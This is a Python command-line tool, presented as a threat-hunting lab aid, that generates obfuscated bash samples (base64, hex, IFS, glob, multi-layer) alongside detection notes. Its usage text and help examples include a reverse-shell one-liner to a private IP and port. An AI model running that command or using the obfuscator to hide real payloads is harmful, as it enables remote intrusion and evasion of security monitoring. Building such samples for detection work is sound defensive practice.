#!/usr/bin/env python3
"""
Bash Script Obfuscator - Threat Hunting Lab Tool
Author: DangerNudel
Purpose: Generate obfuscated bash samples for detection rule development and analyst training.
Target: GNU bash 5.2.15(1)-release

Usage:
    python3 bash_obfuscator.py -f script.sh -t b64
    python3 bash_obfuscator.py -f script.sh -t hex
    python3 bash_obfuscator.py -f script.sh -t vars
    python3 bash_obfuscator.py -f script.sh -t ansi
    python3 bash_obfuscator.py -f script.sh -t multi
    python3 bash_obfuscator.py -f script.sh -t all
    python3 bash_obfuscator.py --inline 'bash -i >& /dev/tcp/10.50.160.3/9150 0>&1' -t all
    python3 bash_obfuscator.py -f script.sh -t multi --layers 3
    python3 bash_obfuscator.py --list-techniques
"""

import argparse
import base64
import random
import string
import sys
import os
from textwrap import dedent

# ─────────────────────────────────────────────
# UTILITIES
# ─────────────────────────────────────────────

def rand_var(length=None):
    """Generate a random variable name."""
    length = length or random.randint(3, 8)
    return '_' + ''.join(random.choices(string.ascii_lowercase, k=length))

def to_hex(s):
    """Convert a string to \\xNN hex escape sequence."""
    return ''.join(f'\\x{ord(c):02x}' for c in s)

def to_b64(s):
    """Base64 encode a string."""
    return base64.b64encode(s.encode()).decode()

def split_string_randomly(s, min_parts=2, max_parts=5):
    """Split a string into random chunks."""
    parts = []
    n = random.randint(min_parts, min(max_parts, max(2, len(s) // 2)))
    indices = sorted(random.sample(range(1, len(s)), min(n - 1, len(s) - 1)))
    prev = 0
    for idx in indices:
        parts.append(s[prev:idx])
        prev = idx
    parts.append(s[prev:])
    return [p for p in parts if p]

def strip_shebang(script):
    """Return (shebang_line_or_empty, rest_of_script)."""
    lines = script.strip().splitlines()
    if lines and lines[0].startswith('#!'):
        return lines[0], '\n'.join(lines[1:]).strip()
    return '', script.strip()

def get_payload(script):
    """Strip shebang and comments, return executable payload."""
    _, body = strip_shebang(script)
    # Remove comment-only lines
    lines = [l for l in body.splitlines() if l.strip() and not l.strip().startswith('#')]
    return '\n'.join(lines)


# ─────────────────────────────────────────────
# OBFUSCATION TECHNIQUES
# ─────────────────────────────────────────────

def technique_base64(script):
    """
    Technique: Base64 + eval
    Pattern: eval "$(echo '<b64>' | base64 -d)"
    Detection targets: base64 -d piped to bash/eval, eval with command substitution
    """
    payload = get_payload(script)
    encoded = to_b64(payload)
    
    # Randomize: sometimes split the b64 string across vars
    if random.choice([True, False]):
        parts = split_string_randomly(encoded, 2, 4)
        var_names = [rand_var() for _ in parts]
        assignments = '\n'.join(f'{v}=\'{p}\'' for v, p in zip(var_names, parts))
        concat = ''.join(f'${{{v}}}' for v in var_names)
        body = f"{assignments}\neval \"$(echo {concat} | base64 -d)\""
    else:
        body = f"eval \"$(echo '{encoded}' | base64 -d)\""

    return f"#!/usr/bin/bash\n{body}"


def technique_hex(script):
    """
    Technique: Hex encoding via printf + eval
    Pattern: eval $(printf '\\xNN\\xNN...')
    Detection targets: printf with \\x sequences piped or eval'd
    """
    payload = get_payload(script)
    hex_str = to_hex(payload)
    
    # Optionally wrap in a variable
    if random.choice([True, False]):
        v = rand_var()
        body = f"{v}=$(printf '{hex_str}')\neval \"${{{v}}}\""
    else:
        body = f"eval $(printf '{hex_str}')"

    return f"#!/usr/bin/bash\n{body}"


def technique_vars(script):
    """
    Technique: Variable substitution — splits commands/strings into assembled vars.
    Detection targets: short random var names assembling commands, eval of concatenated vars
    """
    payload = get_payload(script)
    tokens = payload.split()
    var_map = {}
    assignments = []

    for token in tokens:
        parts = split_string_randomly(token, 2, 4)
        part_vars = []
        for part in parts:
            v = rand_var()
            assignments.append(f"{v}='{part}'")
            part_vars.append(f'${{{v}}}')
        var_map[token] = ''.join(part_vars)

    reconstructed = ' '.join(var_map[t] for t in tokens)
    body = '\n'.join(assignments) + f'\neval "{reconstructed}"'
    return f"#!/usr/bin/bash\n{body}"


def technique_ansi(script):
    """
    Technique: ANSI-C quoting ($'\\xNN') for command words only.
    Detection targets: $'\\x...' syntax in command position, hex command names
    """
    payload = get_payload(script)
    tokens = payload.split(' ', 1)
    cmd = tokens[0]
    rest = tokens[1] if len(tokens) > 1 else ''
    
    ansi_cmd = "$'" + to_hex(cmd) + "'"
    body = f"{ansi_cmd} {rest}" if rest else ansi_cmd
    return f"#!/usr/bin/bash\n{body}"


def technique_ifs(script):
    """
    Technique: IFS manipulation to split command tokens.
    Detection targets: IFS reassignment, unusual read -r patterns before command execution
    """
    payload = get_payload(script)
    tokens = payload.split()
    cmd = tokens[0]
    
    # Split the command word using a custom delimiter
    delim = random.choice(['_', ':', '@', '%'])
    parts = split_string_randomly(cmd, 2, 3)
    joined = delim.join(parts)
    
    var_names = [rand_var() for _ in parts]
    read_vars = ' '.join(var_names)
    concat = ''.join(f'${{{v}}}' for v in var_names)
    rest = ' '.join(tokens[1:])
    
    body = (
        f"IFS={delim} read -r {read_vars} <<< '{joined}'\n"
        f"eval \"{concat} {rest}\""
    )
    return f"#!/usr/bin/bash\n{body}"


def technique_heredoc(script):
    """
    Technique: Heredoc pipe to bash.
    Detection targets: heredoc with encoded content piped to bash/eval
    """
    payload = get_payload(script)
    encoded = to_b64(payload)
    label = rand_var(6).upper().lstrip('_')
    
    body = (
        f"base64 -d << '{label}' | bash\n"
        f"{encoded}\n"
        f"{label}"
    )
    return f"#!/usr/bin/bash\n{body}"


def technique_glob(script):
    """
    Technique: Glob/wildcard expansion for binary paths.
    Detection targets: wildcard paths like /???/b*sh, /usr/b?n/ba??
    """
    payload = get_payload(script)
    tokens = payload.split(' ', 1)
    cmd = tokens[0]
    rest = tokens[1] if len(tokens) > 1 else ''

    # Build a glob that matches the command
    # Replace alternating chars with ? wildcards
    if '/' not in cmd:
        # bare command name - wrap with env or use path glob
        glob_cmd = '/' + '??' * 3 + '/' + cmd[0] + '?' * (len(cmd) - 2) + cmd[-1]
    else:
        parts = cmd.split('/')
        glob_parts = []
        for p in parts:
            if not p:
                glob_parts.append('')
                continue
            # Replace some chars with ?
            new_p = ''
            for i, c in enumerate(p):
                if i % 2 == 1 and len(p) > 2:
                    new_p += '?'
                else:
                    new_p += c
            glob_parts.append(new_p)
        glob_cmd = '/'.join(glob_parts)

    body = f"{glob_cmd} {rest}" if rest else glob_cmd
    return f"#!/usr/bin/bash\n# Note: glob expansion requires bash with globbing enabled\n{body}"


def technique_multi_layer(script, layers=2):
    """
    Technique: Chained multi-layer obfuscation.
    Applies multiple techniques in sequence.
    Detection targets: multiple obfuscation indicators stacked
    """
    # Ordered technique pool for chaining
    chain_techniques = [
        technique_vars,
        technique_base64,
        technique_hex,
        technique_ifs,
    ]
    
    result = script
    chosen = random.sample(chain_techniques, min(layers, len(chain_techniques)))
    
    log = []
    for i, tech in enumerate(chosen):
        result = tech(result)
        log.append(f"  Layer {i+1}: {tech.__name__.replace('technique_', '')}")
    
    return result, log


# ─────────────────────────────────────────────
# TECHNIQUE REGISTRY
# ─────────────────────────────────────────────

TECHNIQUES = {
    'b64':   (technique_base64,   "Base64 encode + eval"),
    'hex':   (technique_hex,      "Hex encode via printf + eval"),
    'vars':  (technique_vars,     "Variable substitution + assembly"),
    'ansi':  (technique_ansi,     "ANSI-C quoting ($'\\xNN') on command word"),
    'ifs':   (technique_ifs,      "IFS manipulation + read split"),
    'here':  (technique_heredoc,  "Heredoc pipe to bash"),
    'glob':  (technique_glob,     "Glob/wildcard path expansion"),
    'multi': (None,               "Multi-layer chained obfuscation"),
    'all':   (None,               "Run all techniques individually"),
}


# ─────────────────────────────────────────────
# OUTPUT
# ─────────────────────────────────────────────

def print_section(title, content, detection_note=None):
    width = 60
    print(f"\n{'═' * width}")
    print(f"  {title}")
    print(f"{'═' * width}")
    print(content)
    if detection_note:
        print(f"\n  [Hunt Target] {detection_note}")

def print_banner():
    print(dedent("""
    ╔══════════════════════════════════════════════════════════╗
    ║          Bash Obfuscator - Threat Hunt Lab Tool          ║
    ║      GNU bash 5.2.15(1)-release Compatible               ║
    ╚══════════════════════════════════════════════════════════╝
    """))

DETECTION_NOTES = {
    'b64':  "base64 -d | bash or eval with base64 decode — high signal",
    'hex':  "printf with \\x sequences + eval — uncommon in legit scripts",
    'vars': "Multiple short random vars assembling a command string",
    'ansi': "$'\\x...' syntax in command position — rare outside obfuscation",
    'ifs':  "IFS reassignment followed by command execution",
    'here': "Heredoc with base64 content piped to bash",
    'glob': "Wildcard paths like /???/b?sh — anomalous process image paths",
}


# ─────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────

def parse_args():
    parser = argparse.ArgumentParser(
        description='Bash Script Obfuscator for Threat Hunting Lab',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=dedent("""
        Techniques:
          b64    Base64 + eval
          hex    Hex encode via printf + eval
          vars   Variable substitution and assembly
          ansi   ANSI-C quoting on command words
          ifs    IFS manipulation
          here   Heredoc pipe to bash
          glob   Glob/wildcard path expansion
          multi  Multi-layer chained (use --layers N)
          all    All techniques individually

        Examples:
          python3 bash_obfuscator.py -f rev.sh -t all
          python3 bash_obfuscator.py --inline 'bash -i >& /dev/tcp/10.50.160.3/9150 0>&1' -t b64
          python3 bash_obfuscator.py -f rev.sh -t multi --layers 3
          python3 bash_obfuscator.py -f rev.sh -t all -o ./output_samples/
        """)
    )
    source = parser.add_mutually_exclusive_group(required=False)
    source.add_argument('-f', '--file', help='Input bash script file')
    source.add_argument('--inline', help='Inline bash command string to obfuscate')

    parser.add_argument('-t', '--technique', choices=list(TECHNIQUES.keys()),
                        default='all', help='Obfuscation technique (default: all)')
    parser.add_argument('--layers', type=int, default=2,
                        help='Number of layers for multi-layer mode (default: 2)')
    parser.add_argument('-o', '--output-dir',
                        help='Save each technique output to a .sh file in this directory')
    parser.add_argument('--list-techniques', action='store_true',
                        help='List all available techniques and exit')
    parser.add_argument('--seed', type=int,
                        help='Random seed for reproducible output')
    return parser.parse_args()


def main():
    args = parse_args()

    print_banner()

    if args.list_techniques:
        print("Available Techniques:\n")
        for key, (_, desc) in TECHNIQUES.items():
            print(f"  {key:<8} {desc}")
        print()
        return

    # Require input
    if not args.file and not args.inline:
        print("[!] Provide either -f <file> or --inline '<command>'")
        sys.exit(1)

    if args.seed is not None:
        random.seed(args.seed)

    # Load script
    if args.file:
        with open(args.file, 'r') as fh:
            script = fh.read()
    else:
        script = f"#!/usr/bin/bash\n{args.inline}"

    print(f"[*] Original Payload:")
    print(f"    {get_payload(script)}\n")

    results = {}

    if args.technique == 'all':
        single_techs = {k: v for k, v in TECHNIQUES.items()
                        if k not in ('all', 'multi')}
        for key, (func, desc) in single_techs.items():
            output = func(script)
            results[key] = output
            print_section(
                f"[{key.upper()}] {desc}",
                output,
                DETECTION_NOTES.get(key)
            )
        # Also run multi
        output, log = technique_multi_layer(script, layers=args.layers)
        results['multi'] = output
        print_section(
            f"[MULTI] Multi-layer ({args.layers} layers)",
            output,
            "Multiple stacked obfuscation indicators — simulates real adversary tooling"
        )
        print("  Layers applied:")
        for l in log:
            print(f"   {l}")

    elif args.technique == 'multi':
        output, log = technique_multi_layer(script, layers=args.layers)
        results['multi'] = output
        print_section(
            f"[MULTI] Multi-layer ({args.layers} layers)",
            output,
            "Multiple stacked obfuscation indicators"
        )
        print("  Layers applied:")
        for l in log:
            print(f"   {l}")

    else:
        func, desc = TECHNIQUES[args.technique]
        output = func(script)
        results[args.technique] = output
        print_section(
            f"[{args.technique.upper()}] {desc}",
            output,
            DETECTION_NOTES.get(args.technique)
        )

    # Optionally save to files
    if args.output_dir:
        os.makedirs(args.output_dir, exist_ok=True)
        for key, content in results.items():
            out_path = os.path.join(args.output_dir, f"obfuscated_{key}.sh")
            with open(out_path, 'w') as fh:
                fh.write(content + '\n')
            print(f"\n[+] Saved: {out_path}")

    print(f"\n{'═' * 60}")
    print(f"  {len(results)} sample(s) generated.")
    print(f"{'═' * 60}\n")


if __name__ == '__main__':
    main()
